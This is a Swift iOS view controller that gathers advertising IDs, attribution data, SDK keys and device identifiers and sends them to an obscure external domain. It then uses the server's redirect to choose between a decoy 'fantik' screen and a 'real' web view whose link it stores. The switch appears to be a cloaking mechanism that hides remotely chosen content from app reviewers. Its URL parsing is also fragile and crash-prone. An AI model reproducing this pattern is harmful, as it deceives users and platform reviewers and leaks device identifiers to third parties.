//
//  StartViewController.swift
//  MetricaTest
//
//  Created by Vitaliy Kozlov on 15/04/2019.
//  Copyright © 2019 Vitaliy Kozlov. All rights reserved.
//

import UIKit
import WebKit
import FacebookCore
import FBSDKCoreKit.FBSDKAppLinkUtility
import AdSupport
import YandexMobileMetrica

class StartViewController: UIViewController, WKNavigationDelegate, WKUIDelegate {
    var facebookData = String ()
    let webView = WKWebView()
    var isFirst = "wv"
    let timeStart = Date()
    override func loadView() {
        self.view = webView
        webView.navigationDelegate = self
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        NotificationCenter.default.addObserver(self, selector: #selector(webViewStart), name: appFlayerDataLoaded, object: nil)
        FBSDKAppLinkUtility.fetchDeferredAppLink { [weak self] (url, error) in
            guard let self = self else {return}
            if (error != nil) {
                return
            }
            print ("DEEEP LIINK")
            print (url)
            if let urlUnrap = url {
                let stringUrl  = "\(urlUnrap)"
                let dataFacebook = stringUrl.components(separatedBy: "//fb?")
                self.facebookData = dataFacebook[1]
                print ("FACEBOOK DATA")
                print (self.facebookData)
            }
        }
        let isFirstString = UserDefaults.standard.string(forKey: "notFirstLaunchApp")
        if isFirstString == nil {
            UserDefaults.standard.set(true, forKey: "notFirstLaunchApp")
            isFirst = "tech"
        }
    }
    
    
    func webView(_ webView: WKWebView, didReceiveServerRedirectForProvisionalNavigation navigation: WKNavigation!) {
        print ("Redirect")
        // print (webView.url)
        print (appsFlyerData)
        guard let redirectUrl = webView.url else {return}
        let redirect = "\(redirectUrl)"
        switch redirect {
        case "https://www.bisefusanadom.com/":
            performSegue(withIdentifier: "fantikSegue", sender: self)
        default:
            print (redirect)
            let firstArr = redirect.components(separatedBy: "app_click_id=")
            let secondArr = firstArr[1].components(separatedBy: "&")
            let appClickId = secondArr[0]
            print ("APPCLICKID")
            print (appClickId)
            // print (secondArr[1])
            let link1 = redirect.components(separatedBy: "https://")
            //print (link1[1])
            let link2 = link1[2].components(separatedBy: "?")
            link = "https://" + link2[0] + "?subId1=" + appClickId
            print ("Link")
            print (link)
            if isFirst == "tech" {
              UserDefaults.standard.set(appClickId, forKey: "appClickIdApp")
               UserDefaults.standard.set(link, forKey: "link")
            } else {
                let array = redirect.components(separatedBy: "app_change_link=")
                let changeLinkFlag = array[0].prefix(1)
                if changeLinkFlag == "1" {
                    UserDefaults.standard.set(link, forKey: "link")
                     UserDefaults.standard.set(appClickId, forKey: "appClickIdApp")
                }
            }
            
            performSegue(withIdentifier: "realSegue", sender: self)
        }
        
        //  print (navigation.debugDescription)
    }
    @objc func webViewStart () {
        
        var appFlyerString = ""
        if appsFlyerData["campaign_id"] != nil {
            let ad_campaign_id = "\(appsFlyerData["campaign_id"] ?? "")"
            appFlyerString = appFlyerString + "&ad_campaign_id=\(ad_campaign_id)"
        }
        if appsFlyerData["adgroup_id"] != nil {
            let creative_id = "\(appsFlyerData["adgroup_id"] ?? "")"
            appFlyerString = appFlyerString + "&creative_id=\(creative_id)"
        }
        if appsFlyerData["adgroup_id"] != nil {
            let sub_id_3 = "\(appsFlyerData["adgroup_id"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_3=\(sub_id_3)"
        }
        if appsFlyerData["media_source"] != nil {
            let sub_id_6 = "\(appsFlyerData["media_source"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_6=\(sub_id_6)"
        }
        if appsFlyerData["af_c_id"] != nil {
            let ad_campaign_id = "\(appsFlyerData["af_c_id"] ?? "")"
            appFlyerString = appFlyerString + "&ad_campaign_id=\(ad_campaign_id)"
        }
        if appsFlyerData["af_ad_id"] != nil{
            let creative_id = "\(appsFlyerData["af_ad_id"] ?? "")"
            appFlyerString = appFlyerString + "&creative_id=\(creative_id)"
        }
        if appsFlyerData["af_ad_id"] != nil{
            let sub_id_3 = "\(appsFlyerData["af_ad_id"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_3=\(sub_id_3)"
        }
        if appsFlyerData["campaign"] != nil {
            let sub_id_4 = "\(appsFlyerData["campaign"] ?? "")"
            if sub_id_4 != "None" {
            appFlyerString = appFlyerString + "&sub_id_4=\(sub_id_4)"
            }
        }
        if appsFlyerData["c"] != nil {
            let sub_id_4 = "\(appsFlyerData["c"] ?? "")"
            if sub_id_4 != "None" {
            appFlyerString = appFlyerString + "&sub_id_4=\(sub_id_4)"
            }
        }
        if appsFlyerData["af_prt"] != nil {
            let sub_id_5 = "\(appsFlyerData["af_prt"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_5=\(sub_id_5)"
        }
        
        if appsFlyerData["pid"] != nil {
            let sub_id_6 = "\(appsFlyerData["pid"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_6=\(sub_id_6)"
        }
        if appsFlyerData["af_sub1"] != nil {
            let sub_id_11 = "\(appsFlyerData["af_sub1"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_11=\(sub_id_11)"
        }
        if appsFlyerData["af_sub2"] != nil {
            let sub_id_12 = "\(appsFlyerData["af_sub2"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_12=\(sub_id_12)"
        }
        if appsFlyerData["af_sub3"] != nil {
            let sub_id_13 = "\(appsFlyerData["af_sub3"] ?? "")"
            appFlyerString = appFlyerString + "&sub_id_13=\(sub_id_13)"
        }
        
        if appsFlyerData["af_status"] != nil {
            let sub_id_6 = "\(appsFlyerData["af_status"] ?? "")"
            if sub_id_6 == "Organic"{
            appFlyerString = appFlyerString + "&sub_id_6=\(sub_id_6)"
            }
            
        }
       
        if appsFlyerData["campaign"] != nil {
            let temp = "\(appsFlyerData["campaign"] ?? "")"
            if temp != "None" {
            let array = temp.components(separatedBy: "_")
                if array.count >= 1 {
                  appFlyerString = appFlyerString + "&sub_id_1=\(array[0])"
                }
                if array.count >= 2 {
                    appFlyerString = appFlyerString + "&sub_id_2=\(array[1])"
                }
                if array.count >= 3 {
                    appFlyerString = appFlyerString + "&extra_param_6=\(array[2])"
                }
            }
        }
        if appsFlyerData["c"] != nil {
            let temp = "\(appsFlyerData["c"] ?? "")"
            if temp != "None" {
                let array = temp.components(separatedBy: "_")
                if array.count >= 1 {
                    appFlyerString = appFlyerString + "&sub_id_1=\(array[0])"
                }
                if array.count >= 2 {
                    appFlyerString = appFlyerString + "&sub_id_2=\(array[1])"
                }
                if array.count >= 3 {
                    appFlyerString = appFlyerString + "&extra_param_6=\(array[2])"
                }
            }
        }
        // IDFA
        let myIDFA: String?
        if ASIdentifierManager.shared().isAdvertisingTrackingEnabled {
            myIDFA = ASIdentifierManager.shared().advertisingIdentifier.uuidString
        } else {
            myIDFA = nil
        }
        var idfaString = ""
        if myIDFA != nil {
            idfaString = "&sub_id_8=\(myIDFA ?? "")"
        }
        // BundleID
        var bundleIdString = ""
        let bundleIdentifier =  Bundle.main.bundleIdentifier
        if bundleIdentifier != nil {
            bundleIdString = "&sub_id_9=\(bundleIdentifier ?? "")"
        }
        // AF key
        let AfKeyString = "&sub_id_14=\(appsFlyerDevKey)"
        // appClickId
        var appClickIdParam = ""
        if isFirst == "wv" {
            let extra7 = UserDefaults.standard.string(forKey: "appClickIdApp") ?? ""
            appClickIdParam = "&extra_param_7=\(extra7)"
        }
        // Metrica
        var metricaID = ""
        YMMYandexMetrica.requestAppMetricaDeviceID(withCompletionQueue: DispatchQueue.main,completionBlock: { [weak self] appMetricaDeviceID, error in
            guard let self = self else {return}
            metricaID = appMetricaDeviceID ?? ""
            print ("TESTMETRICA")
            
            let timeFinish = Date()
            let executionTime = timeFinish.timeIntervalSince((self.timeStart))
            print (executionTime)
            let timeParam = "&sub_id_10=\(self.isFirst ?? "")_1_174_Ankizh_iOS_\(executionTime)"
            let metricaString = "&extra_param_5=\(appMetricaApiKey)_\(appKey)_\(metricaID)"
        
            let url = URL(string: "https://hovichuvni.mikemilikanich.site/Bj7QZbNj" + "?" + self.facebookData + appFlyerString + idfaString + bundleIdString + AfKeyString + metricaString + appClickIdParam + timeParam)!
            print ("URL")
            print (url)
            
            DispatchQueue.main.async {[weak self] in
                guard let self = self else {return}
                self.webView.load(URLRequest(url: url))
                self.webView.allowsBackForwardNavigationGestures = true
            }
        })
       
        
        
    }
    /*
     // MARK: - Navigation
     
     // In a storyboard-based application, you will often want to do a little preparation before navigation
     override func prepare(for segue: UIStoryboardSegue, sender: Any?) {
     // Get the new view controller using segue.destination.
     // Pass the selected object to the new view controller.
     }
     */
    
}
